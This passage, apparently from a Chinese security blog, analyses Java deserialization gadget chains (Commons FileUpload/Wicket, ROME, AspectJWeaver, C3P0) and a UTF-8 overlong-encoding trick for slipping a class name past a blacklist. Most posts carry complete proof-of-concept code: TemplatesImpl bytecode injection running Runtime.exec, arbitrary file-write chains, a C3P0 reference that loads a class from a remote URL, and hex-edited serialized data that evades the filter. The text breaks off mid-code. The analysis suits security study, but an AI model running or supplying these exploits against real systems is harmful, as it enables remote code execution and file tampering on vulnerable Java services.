getOutputStream方法：由于dfos无法反序列化(transient)，只能为空；getTempFile方法返回一个File对象，其中repository是可以控制的，也就是目录是可控的，但是文件名不可控(低版本可以用空字符绕过，使得文件名也可控)； 最终返回一个DeferredFileOutputStream对象；cachedContent可以通过反射改为我们想要写的内容，那么就可以任意目录写 123456789101112131415161718private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { // read values in.defaultReadObject(); OutputStream output = getOutputStream(); if (cachedContent != null) { output.write(cachedContent); } else { FileInputStream input = new FileInputStream(dfosFile); IOUtils.copy(input, output); dfosFile.delete(); dfosFile = null; } output.close(); cachedContent = null;} 12345678910111213141516171819202122public OutputStream getOutputStream() throws IOException { if (dfos == null) { File outputFile = getTempFile(); dfos = new DeferredFileOutputStream(sizeThreshold, outputFile); } return dfos;}protected File getTempFile() { if (tempFile == null) { File tempDir = repository; if (tempDir == null) { tempDir = new File(System.getProperty(&quot;java.io.tmpdir&quot;)); } String tempFileName = format(&quot;upload_%s_%s.tmp&quot;, UID, getUniqueId()); tempFile = new File(tempDir, tempFileName); } return tempFile;} writeObject; 要使得cachedContent可控，就要使得dfos.isInMemory()返回True; 123456789101112private void writeObject(ObjectOutputStream out) throws IOException { // Read the data if (dfos.isInMemory()) { cachedContent = get(); } else { cachedContent = null; dfosFile = dfos.getFile(); } // write out values out.defaultWriteObject();} 其实也就是通过判断 written 的长度和 threshold 阈值长度大小，如果写入大于阈值，则会被写出到文件中，那就不是存在内存中了 123456789 public boolean isInMemory() { return !isThresholdExceeded(); }//org.apache.commons.io.output.ThresholdingOutputStream类下 public boolean isThresholdExceeded() { return written &gt; threshold; } Poc 12345678910111213141516171819202122232425262728293031323334353637383940package fileupload;import org.apache.commons.fileupload.disk.DiskFileItem;import org.apache.commons.io.output.DeferredFileOutputStream;import java.io.*;import java.lang.reflect.Field;public class Test1 { public static void main(String[] args) throws Exception { byte[] bytes = &quot;zIxyd...&quot;.getBytes(); File repository = new File(&quot;E:/tmp&quot;); DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, repository); DeferredFileOutputStream deferredFileOutputStream = new DeferredFileOutputStream(0, null); Field dfos = diskFileItem.getClass().getDeclaredField(&quot;dfos&quot;); dfos.setAccessible(true); dfos.set(diskFileItem,deferredFileOutputStream); Field cachedContent = diskFileItem.getClass().getDeclaredField(&quot;cachedContent&quot;); cachedContent.setAccessible(true); cachedContent.set(diskFileItem,bytes); serialize(diskFileItem); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} Wicket1Apache Wicket 抄了 FileUpload 的代码,就是说包名不同，攻击手法和FileUpload1是一样的","link":"/2024/03/11/Groovy+Click1+FileUpload1/"},{"title":"rome+AspectJWeaver+C3P0","text":"ROMEpopgadget 12345678910TemplatesImpl.getOutputProperties()NativeMethodAccessorImpl.invoke0(Method, Object, Object[])NativeMethodAccessorImpl.invoke(Object, Object[])DelegatingMethodAccessorImpl.invoke(Object, Object[])Method.invoke(Object, Object...)ToStringBean.toString(String)ToStringBean.toString()EqualsBean.hashCode()HashMap&lt;K,V&gt;.hash(Object)HashMap&lt;K,V&gt;.readObject(ObjectInputStream) 我这样写比ysoserial上的链更简单点，感觉ysoserial上的链有一些不必要用的；比如”ObjectBean”;完全可以通过EqualsBean本身的hashCode()函数跳到EqualsBean.beanHashCode()，而不需要用的”ObjectBean.hashCode”； 环境依赖 1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;rome&lt;/groupId&gt; &lt;artifactId&gt;rome&lt;/artifactId&gt; &lt;version&gt;1.0&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 分析gadget: com.sun.syndication.feed.impl.EqualsBean类 1234567891011121314151617181920 public EqualsBean(Class beanClass,Object obj) { if (!beanClass.isInstance(obj)) { throw new IllegalArgumentException(obj.getClass()+&quot; is not instance of &quot;+beanClass); } _beanClass = beanClass; _obj = obj; }public int hashCode() { return beanHashCode(); } public int beanHashCode() { return _obj.toString().hashCode(); } public int beanHashCode() { return _obj.toString().hashCode(); } _obj是可控制的，那么就可以调用ToStringBean.toString(); com.sun.syndication.feed.impl.ToStringBean类 123456789101112131415161718192021222324252627282930313233343536373839404142public ToStringBean(Class beanClass,Object obj) { _beanClass = beanClass; _obj = obj;}public String toString() { Stack stack = (Stack) PREFIX_TL.get(); String[] tsInfo = (String[]) ((stack.isEmpty()) ? null : stack.peek()); String prefix; if (tsInfo==null) { String className = _obj.getClass().getName(); prefix = className.substring(className.lastIndexOf(&quot;.&quot;)+1); } else { prefix = tsInfo[0]; tsInfo[1] = prefix; } return toString(prefix);}private String toString(String prefix) { StringBuffer sb = new StringBuffer(128); try { PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(_beanClass); if (pds!=null) { for (int i=0;i&lt;pds.length;i++) { String pName = pds[i].getName(); Method pReadMethod = pds[i].getReadMethod(); if (pReadMethod!=null &amp;&amp; // ensure it has a getter method pReadMethod.getDeclaringClass()!=Object.class &amp;&amp; // filter Object.class getter methods pReadMethod.getParameterTypes().length==0) { Object value = pReadMethod.invoke(_obj,NO_PARAMS); printProperty(sb,prefix+&quot;.&quot;+pName,value); } } } } catch (Exception ex) { sb.append(&quot;\\n\\nEXCEPTION: Could not complete &quot;+_obj.getClass()+&quot;.toString(): &quot;+ex.getMessage()+&quot;\\n&quot;); } return sb.toString();} 这里toString的无参方法最终会调用的toString的有参方法；而toString(String prefix)方法中 在Java中，BeanIntrospector.getPropertyDescriptors(_beanClass);是一个用来获取指定 Java Bean 类的属性描述符（PropertyDescriptor）数组的方法。PropertyDescriptor包含了Java Bean类的属性的信息，比如属性名称、属性的getter方法和setter方法等 getReadMethod()：是 PropertyDescriptor 类中的一个方法，用于获取与当前属性相关联的读取方法（getter 方法）。而获取setter方法对应的函数就是”getWriteMethod()”; _beanClass和_obj也是可以通过构造函数控制的；所以就可以调用任意对象的getter方法，第一个想到的就是TemplatesImpl类中的.getOutputProperties()函数； poc 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ToStringBean;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;public class Test1 { public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); TemplatesImpl fakeTemplates = new TemplatesImpl(); Class templatesClass = templates.getClass(); Field name = templatesClass.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates,&quot;zIxyd&quot;); byte[] code = Files.readAllBytes(Paths.get(&quot;E:/tmp/Calc.class&quot;)); byte[][] bytes= {code}; Field bytecodes = templatesClass.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates,bytes);// Field tfactory = templatesClass.getDeclaredField(&quot;_tfactory&quot;);// tfactory.setAccessible(true);// tfactory.set(templates,new TransformerFactoryImpl()); //防止在序列化时就代码执行，先弄一个没用的实例 ToStringBean toStringBean = new ToStringBean(Templates.class, fakeTemplates); EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(equalsBean,1); //防止在序列化时就代码执行，再通过反射将对象改成恶意的TemplatesImpl实例 Class toStringBeanClass = toStringBean.getClass(); Field obj = toStringBeanClass.getDeclaredField(&quot;_obj&quot;); obj.setAccessible(true); obj.set(toStringBean,templates); serialize(hashMap); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} 其中有一个坑点: 1ToStringBean toStringBean = new ToStringBean(TemplatesImpl.class, fakeTemplates); ToStringBean类中的第一个参数不能写TemplatesImpl.class（其实一开始我为了途方便，写的就是这个，否则反序列化不能执行代码； “学习”；知其然知其所以然；调试看看，为什么不行； 如果第一个参数写TemplatesImpl.class，在使用BeanIntrospector.getPropertyDescriptors(_beanClass);就会有五个参数符合条件； 而要利用的getOutputProperties排在第三个，也就是数组下标为2的元素 但是在反序列化时，当遍历到第二个元素时，就会报空指针异常，所以根本不会执行到要利用的getPropertyDescriptors函数 1private transient ThreadLocal _sdom = new ThreadLocal(); 其实_sdom属性默认是有值的，但是被transient修饰了，所以反序列化时会为空 解决方法之一就是将ToStringBean函数的第一个参数改成Templates.class,这样在获取javabean的(getter,setter)方法时，就只会得到getPropertyDescriptors方法； 还有一条可以更简单的链: gadget: 123456789TemplatesImpl.getOutputProperties()NativeMethodAccessorImpl.invoke0(Method, Object, Object[])NativeMethodAccessorImpl.invoke(Object, Object[])DelegatingMethodAccessorImpl.invoke(Object, Object[])Method.invoke(Object, Object...)EqualsBean.beanEquals(Object obj)AbstractMap.equals(Object obj)HashMap&lt;K,V&gt;.putVal(int hash, K key, V value, boolean onlyIfAbsent,boolean evict)HashMap&lt;K,V&gt;.readObject(ObjectInputStream) 在com.sun.syndication.feed.impl.EqualsBean类中的equals调用了beanEquals方法；而这个方法中存在pReadMethod.invoke(bean1, NO_PARAMS); 可以简单分析一下”beanEquals”函数，如果想要调用的”pReadMethod.invoke”;要使得eq = true;否则for循环都进不去 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public boolean equals(Object obj) { return beanEquals(obj);}public boolean beanEquals(Object obj) { Object bean1 = _obj; Object bean2 = obj; boolean eq; if (bean2==null) { eq = false; } else if (bean1==null &amp;&amp; bean2==null) { eq = true; } else if (bean1==null || bean2==null) { eq = false; } else { if (!_beanClass.isInstance(bean2)) { eq = false; } else { eq = true; try { PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(_beanClass); if (pds!=null) { for (int i = 0; eq &amp;&amp; i&lt;pds.length; i++) { Method pReadMethod = pds[i].getReadMethod(); if (pReadMethod!=null &amp;&amp; pReadMethod.getDeclaringClass()!=Object.class &amp;&amp; pReadMethod.getParameterTypes().length==0) { Object value1 = pReadMethod.invoke(bean1, NO_PARAMS); Object value2 = pReadMethod.invoke(bean2, NO_PARAMS); eq = doEquals(value1, value2); } } } } catch (Exception ex) { throw new RuntimeException(&quot;Could not execute equals()&quot;, ex); } } } return eq;} 可以利用CC7中的思路，使得两个HashMap相同，从而会调用第二个map的equals方法，因为HashMap没有equals方法，最终会调用HashMap的父类AbstractMap的equals方法； 1234567891011121314151617181920212223242526272829303132public boolean equals(Object o) { if (o == this) return true; if (!(o instanceof Map)) return false; Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o; if (m.size() != size()) return false; try { Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator(); while (i.hasNext()) { Entry&lt;K,V&gt; e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) { if (!(m.get(key)==null &amp;&amp; m.containsKey(key))) return false; } else { if (!value.equals(m.get(key))) // &lt;&lt;===在这里可以调用的EqualsBean.equals return false; } } } catch (ClassCastException unused) { return false; } catch (NullPointerException unused) { return false; } return true;} Poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.syndication.feed.impl.EqualsBean;import javassist.ClassPool;import javassist.CtClass;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;public class Test2 { public static void main(String[] args) throws Exception { String cmd = &quot;calc&quot;; //TemplateImpl 动态加载字节码 String AbstractTranslet = &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;; ClassPool classPool = ClassPool.getDefault(); classPool.appendClassPath(AbstractTranslet); CtClass payload = classPool.makeClass(&quot;a&quot;); payload.setSuperclass(classPool.get(AbstractTranslet)); payload.makeClassInitializer().setBody(&quot;Runtime.getRuntime().exec(\\&quot;&quot; + cmd + &quot;\\&quot;);&quot;); byte[] code = payload.toBytecode(); payload.writeFile(); TemplatesImpl templates = new TemplatesImpl(); TemplatesImpl fakeTemplates = new TemplatesImpl(); Class templatesClass = templates.getClass(); Field name = templatesClass.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates, &quot;zIxyd&quot;);// byte[] code = Files.readAllBytes(Paths.get(&quot;E:/tmp/Calc.class&quot;)); byte[][] bytes = {code}; Field bytecodes = templatesClass.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates, bytes); Field tfactory = templatesClass.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates, new TransformerFactoryImpl()); EqualsBean equalsBean = new EqualsBean(String.class, &quot;zIxyd&quot;); HashMap map1 = new HashMap(); HashMap map2 = new HashMap(); map1.put(&quot;yy&quot;, equalsBean); map1.put(&quot;zZ&quot;, templates); map2.put(&quot;zZ&quot;, equalsBean); map2.put(&quot;yy&quot;, templates); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(map1, &quot;1&quot;); hashMap.put(map2, &quot;2&quot;); Class equalsBeanClass = equalsBean.getClass(); Field beanClass = equalsBeanClass.getDeclaredField(&quot;_beanClass&quot;); beanClass.setAccessible(true); beanClass.set(equalsBean, Templates.class); Field obj = equalsBeanClass.getDeclaredField(&quot;_obj&quot;); obj.setAccessible(true); obj.set(equalsBean, templates); serialize(hashMap); unserialize(); //base64Encode(&quot;ser.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); } public static void base64Encode(String filename){ String filePath = filename; // 指定文件路径 try { File file = new File(filePath); FileInputStream fis = new FileInputStream(file); byte[] data = new byte[(int) file.length()]; fis.read(data); fis.close(); // 使用Base64编码 String base64Encoded = Base64.getEncoder().encodeToString(data); System.out.println(&quot;Base64 编码后的长度: &quot; + base64Encoded.length()); //1360 } catch (Exception e) { e.printStackTrace(); } }} 最后用javassist方法，将文件内容变小了许多； javassist依赖 12345&lt;dependency&gt; &lt;groupId&gt;org.javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.27.0-GA&lt;/version&gt;&lt;/dependency&gt; AspectJWeaver依赖 1234567891011&lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;/groupId&gt; &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt; &lt;version&gt;1.9.6&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt;&lt;/dependency&gt; gadget: 12345678HashSet.readObject() HashMap.put() HashMap.hash() TiedMapEntry.hashCode() TiedMapEntry.getValue() LazyMap.get() SimpleCache$StorableCachingMap.put() SimpleCache$StorableCachingMap.writeToPath() 在 org.aspectj.weaver.tools.cache.SimpleCache 类中定义了一个内部类 StoreableCachingMap，这个类继承了 HashMap，提供了将 Map 中值写入文件中的功能。 文件名，路径名和内容都是可控的； 123456789101112131415161718192021222324252627282930313233343536private StoreableCachingMap(String folder, int storingTimer){ this.folder = folder; initTrace(); this.storingTimer = storingTimer;}public Object put(Object key, Object value) { try { String path = null; byte[] valueBytes = (byte[]) value; if (Arrays.equals(valueBytes, SAME_BYTES)) { path = SAME_BYTES_STRING; } else { path = writeToPath((String) key, valueBytes); // &lt;&lt;== } Object result = super.put(key, path); storeMap(); return result; } catch (IOException e) { trace.error(&quot;Error inserting in cache: key:&quot;+key.toString() + &quot;; value:&quot;+value.toString(), e); Dump.dumpWithException(e); } return null;}private String writeToPath(String key, byte[] bytes) throws IOException { String fullPath = folder + File.separator + key; FileOutputStream fos = new FileOutputStream(fullPath); fos.write(bytes); // &lt;&lt;== fos.flush(); fos.close(); return fullPath;} 示例：利用反射在当前目录下向Test.txt写了内容为”zIxyd…”； 1234567891011121314String fileName = &quot;Test.txt&quot;;String filePath = &quot;.&quot;;String fileContent = &quot;zIxyd...&quot;;Class clazz = Class.forName(&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;);Constructor declaredConstructor = clazz.getDeclaredConstructor(String.class, int.class);declaredConstructor.setAccessible(true);Object o = declaredConstructor.newInstance(filePath, 1);Method declaredMethod = clazz.getDeclaredMethod(&quot;put&quot;, Object.class, Object.class);declaredMethod.setAccessible(true);byte[] bytes = fileContent.getBytes();declaredMethod.invoke(o,fileName,bytes); LazyMap中的get函数调用了put函数；到这里利用链就很明显了(前一部分用CC6，后一部分从LazyMap.get调用的StoreableCachingMap.put); 123456789public Object get(Object key) { // create value for key if key is not currently in the map if (map.containsKey(key) == false) { Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key);} Poc 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class Test1 { public static void main(String[] args) throws Exception { String fileName = &quot;Test.txt&quot;; String filePath = &quot;.&quot;; String fileContent = &quot;zIxyd...&quot;; byte[] bytes = fileContent.getBytes(); Class clazz = Class.forName(&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;); Constructor declaredConstructor = clazz.getDeclaredConstructor(String.class, int.class); declaredConstructor.setAccessible(true); Map o = (Map) declaredConstructor.newInstance(filePath, 1); Map lazyMap = LazyMap.decorate(o, new ConstantTransformer(bytes)); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); //防止在序列化时就执行，所以先不填恶意的lazyMap，等序列完，再通过反射改成LazyMap TiedMapEntry tiedMapEntry = new TiedMapEntry(hashMap, fileName); hashMap.put(tiedMapEntry,1); Class tiedMapEntryClass = TiedMapEntry.class; Field map = tiedMapEntryClass.getDeclaredField(&quot;map&quot;); map.setAccessible(true); map.set(tiedMapEntry,lazyMap); serialize(hashMap); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} C3P0依赖 12345&lt;dependency&gt; &lt;groupId&gt;com.mchange&lt;/groupId&gt; &lt;artifactId&gt;c3p0&lt;/artifactId&gt; &lt;version&gt;0.9.5.2&lt;/version&gt;&lt;/dependency&gt; gadget: 12345PoolBackedDataSourceBase.readObject() ReferenceIndirector.getObject() ReferenceableUtils.referenceToObject() Class.forName0() URLClassLoader.loadClass() PoolBackedDataSourceBase.readObject()；如果变量 o 是否是 IndirectlySerialized 类或其子类的实例。就会调用 ReferenceIndirector.getObject() 1234567891011private void readObject( ObjectInputStream ois ) throws IOException, ClassNotFoundException{ short version = ois.readShort(); switch (version) { case VERSION: // we create an artificial scope so that we can use the name o for all indirectly serialized objects. { Object o = ois.readObject(); if (o instanceof IndirectlySerialized) o = ((IndirectlySerialized) o).getObject(); //&lt;&lt;== ...... 但是IndirectlySerialized没有Serializable接口，注意writeObject函数:当对象不能反序列时；会调用ReferenceIndirector.indirectForm函数将不能反序列化的对象封装；IndirectlySerialized接口的唯一实现类就是ReferenceSerialized； 123456789101112131415161718private void writeObject( ObjectOutputStream oos ) throws IOException{ oos.writeShort( VERSION ); try { //test serialize SerializableUtils.toByteArray(connectionPoolDataSource); oos.writeObject( connectionPoolDataSource ); } catch (NotSerializableException nse) { com.mchange.v2.log.MLog.getLogger( this.getClass() ).log(com.mchange.v2.log.MLevel.FINE, &quot;Direct serialization provoked a NotSerializableException! Trying indirect.&quot;, nse); try { Indirector indirector = new com.mchange.v2.naming.ReferenceIndirector(); oos.writeObject( indirector.indirectForm( connectionPoolDataSource ) ); //&lt;&lt;== } ...... 注意indirectForm函数；会将传递的对象强转成Referenceable接口并调用getReference()方法，最终返回一个Reference对象； 也就是说ref对象，是可控的，这一点对后面的利用非常重要； 所以最终:一个不可序列化的对象经过序列化会封装成ReferenceSerialized对象；之后再反序列化就调用到ReferenceSerialized.getObject()方法 调用到 ReferenceableUtils.referenceToObject()；可以看到使用了 URLClassLoader 从 URL 中加载了类并实例化； ref再上面说过，因为是可控的，所以最后可以使用 URLClassLoader 从 URL 中加载了类并实例化。 Poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;import javax.naming.NamingException;import javax.naming.Reference;import javax.naming.Referenceable;import javax.sql.ConnectionPoolDataSource;import javax.sql.PooledConnection;import java.beans.PropertyVetoException;import java.io.*;import java.sql.SQLException;import java.sql.SQLFeatureNotSupportedException;import java.util.logging.Logger;public class Test1 { //从上面分析到:要序列化的对象分别会强转成ConnectionPoolDataSource和Referenceable public static class payload implements ConnectionPoolDataSource,Referenceable { @Override //序列化时通过&quot;Reference ref = ((Referenceable) orig).getReference();&quot;;会将ref对象变成恶意的Reference对象， public Reference getReference() throws NamingException { return new Reference(&quot;Calc&quot;,&quot;Calc&quot;,&quot;http://127.0.0.1:8000/&quot;); } @Override public PooledConnection getPooledConnection() throws SQLException { return null; } @Override public PooledConnection getPooledConnection(String user, String password) throws SQLException { return null; } @Override public PrintWriter getLogWriter() throws SQLException { return null; } @Override public void setLogWriter(PrintWriter out) throws SQLException { } @Override public void setLoginTimeout(int seconds) throws SQLException { } @Override public int getLoginTimeout() throws SQLException { return 0; } @Override public Logger getParentLogger() throws SQLFeatureNotSupportedException { return null; } } public static void main(String[] args) throws PropertyVetoException, IOException, ClassNotFoundException, InstantiationException, IllegalAccessException { payload payload = new payload(); PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false); poolBackedDataSourceBase.setConnectionPoolDataSource(payload); serialize(poolBackedDataSourceBase); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }}","link":"/2024/03/10/rome+AspectJWeaver+C3P0/"},{"title":"UTF-8 Overlong Encoding","text":"前言：记录以下UTF-8 Overlong Encoding导致的安全问题; 参考: 1ue师傅;lzstar师傅； UTF-8UTF-8 就是一种变长的编码方式。它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度 UTF-8 的编码规则: 对于单字节的符号，字节的第一位设为0，后面7位为这个符号的 Unicode 码。因此对于英语字母，UTF-8 编码和 ASCII 码是相同的。 对于n字节的符号（n &gt; 1），第一个字节的前n位都设为1，第n + 1位设为0，后面字节的前两位一律设为10。剩下的没有提及的二进制位，全部为这个符号的 Unicode 码。 分析假如有一个恶意类(如下) 1234567891011121314151617181920212223package org.zIxyd;import java.io.IOException;import java.io.ObjectInputStream;import java.io.Serializable;public class Calc implements Serializable { private String cmd; public Calc() { } public Calc(String cmd) { this.cmd = cmd; } private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ois.defaultReadObject(); Runtime.getRuntime().exec(this.cmd); }} 如果存在一处代码，可以反序列化这个类，将会导致任意命令执行； 12345678910111213141516171819202122232425262728293031323334353637383940package org.zIxyd;import java.io.*;public class ExpTest { public static void main(String[] args) throws IOException, ClassNotFoundException { Calc calc = new Calc(&quot;calc&quot;); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream); oos.writeObject(calc); String string = byteArrayOutputStream.toString(); System.out.println(string); BytetoHex(byteArrayOutputStream.toByteArray()); //设置黑名单 if (!string.contains(&quot;org.zIxyd.Calc&quot;)) { ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())); ois.readObject(); }else{ System.out.println(&quot;Hacker!!!&quot;); } } public static void BytetoHex(byte[] bytes){ StringBuilder hexString = new StringBuilder(); for (byte b : bytes) { hexString.append(String.format(&quot;%02X&quot;, b)); } System.out.println(hexString.toString()); }}/*输出为：�� \u0005sr \u000eorg.zIxyd.Calc��T��H)|\u0002 \u0001L \u0003cmdt \u0012Ljava/lang/String;xpt \u0004calcACED00057372000E6F72672E7A497879642E43616C63BCF254BC9C48297C0200014C0003636D647400124C6A6176612F6C616E672F537472696E673B787074000463616C63Hacker!!!*/ 但是这处代码有一层waf:!string.contains(&quot;Calc&quot;); 可以看到正常序列化时，序列化的数据会包含className; 接下来调试，看看反序列化时怎么拿到className的，1ue师傅已经给出了调用栈: 12345ObjectStreamClass#readNonProxy(ObjectInputStream in) ObjectInputStream#readUTF() BlockDataInputStream#readUTF() ObjectInputStream#readUTFBody(long utflen) ObjectInputStream#readUTFSpan(StringBuilder sbuf, long utflen) 最后是由ObjectInputStream类下的readUTFSpan方法； 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364private long readUTFSpan(StringBuilder sbuf, long utflen) throws IOException { int cpos = 0; int start = pos; int avail = Math.min(end - pos, CHAR_BUF_SIZE); // stop short of last char unless all of utf bytes in buffer int stop = pos + ((utflen &gt; avail) ? avail - 2 : (int) utflen); boolean outOfBounds = false; try { while (pos &lt; stop) { int b1, b2, b3; b1 = buf[pos++] &amp; 0xFF; switch (b1 &gt;&gt; 4) { case 0: case 1: case 2: case 3: case 4: case 5: case 6: case 7: // 1 byte format: 0xxxxxxx cbuf[cpos++] = (char) b1; break; case 12: case 13: // 2 byte format: 110xxxxx 10xxxxxx b2 = buf[pos++]; if ((b2 &amp; 0xC0) != 0x80) { throw new UTFDataFormatException(); } cbuf[cpos++] = (char) (((b1 &amp; 0x1F) &lt;&lt; 6) | ((b2 &amp; 0x3F) &lt;&lt; 0)); break; case 14: // 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx b3 = buf[pos + 1]; b2 = buf[pos + 0]; pos += 2; if ((b2 &amp; 0xC0) != 0x80 || (b3 &amp; 0xC0) != 0x80) { throw new UTFDataFormatException(); } cbuf[cpos++] = (char) (((b1 &amp; 0x0F) &lt;&lt; 12) | ((b2 &amp; 0x3F) &lt;&lt; 6) | ((b3 &amp; 0x3F) &lt;&lt; 0)); break; default: // 10xx xxxx, 1111 xxxx throw new UTFDataFormatException(); } } } catch (ArrayIndexOutOfBoundsException ex) { outOfBounds = true; } finally { if (outOfBounds || (pos - start) &gt; utflen) { pos = start + (int) utflen; throw new UTFDataFormatException(); } } sbuf.append(cbuf, 0, cpos); return pos - start; } 其中通过switch (b1 &gt;&gt; 4)来判断是:多少个字节为一个字符； 我这里的ClassName为：org.zIxyd.Calc第一个字符为o;其16进制为 0x6f； 根据代码逻辑，会走到处理一个字节对应一个字符的地方;即返回了 o 的char 123case 7: // 1 byte format: 0xxxxxxx cbuf[cpos++] = (char) b1; break; 但难道只有 1 byte format: 0xxxxxxx 时才能获取 o 字符串吗，其实不然，处理俩个字节为一个字符的逻辑和处理三个字节的逻辑都可以返回； 123456789case 12:case 13: // 2 byte format: 110xxxxx 10xxxxxx b2 = buf[pos++]; if ((b2 &amp; 0xC0) != 0x80) { throw new UTFDataFormatException(); } cbuf[cpos++] = (char) (((b1 &amp; 0x1F) &lt;&lt; 6) | ((b2 &amp; 0x3F) &lt;&lt; 0)); break; 这里以两个字节的为列；用python实现:输出一个字母对应的两个字节值 12345678910111213import stringb1 = int(&quot;11000000&quot;, 2)while (b1 &lt;= int(&quot;11011111&quot;, 2)): b2 = int(&quot;10000000&quot;, 2) while (b2 &lt;= int(&quot;10111111&quot;, 2)): cha = chr(((b1 &amp; 0x1F) &lt;&lt; 6) | ((b2 &amp; 0x3F) &lt;&lt; 0)) if (cha in string.ascii_lowercase): print(cha + &quot; &quot; + str(hex(b1)) + &quot; : &quot; + str(hex(b2))) if (cha in string.ascii_uppercase): print(cha + &quot; &quot; + str(hex(b1)) + &quot; : &quot; + str(hex(b2))) b2 = b2 + 1 b1 = b1 + 1 其中可以得知o 0xc1 : 0xaf 现在将之前那段恶意的序列化十六进制数据，将6F改成C1AF，再次反序列化这段数据； 这里需要注意，因为ClassName多了一个字节，对应的长度也要改变； 123456789101112131415161718192021222324252627282930313233343536373839404142package org.zIxyd;import javax.xml.bind.DatatypeConverter;import java.io.ByteArrayInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class CalcTest { public static void main(String[] args) throws IOException, ClassNotFoundException { String hexString = &quot;ACED00057372000FC1AF72672E7A497879642E43616C63BCF254BC9C48297C0200014C0003636D647400124C6A6176612F6C616E672F537472696E673B787074000463616C63&quot;; byte[] byteArray = DatatypeConverter.parseHexBinary(hexString); byte[] bytes = hexStringToByteArray(hexString); String text = new String(bytes); System.out.println(&quot;转换后的字符串为：&quot; + text); if 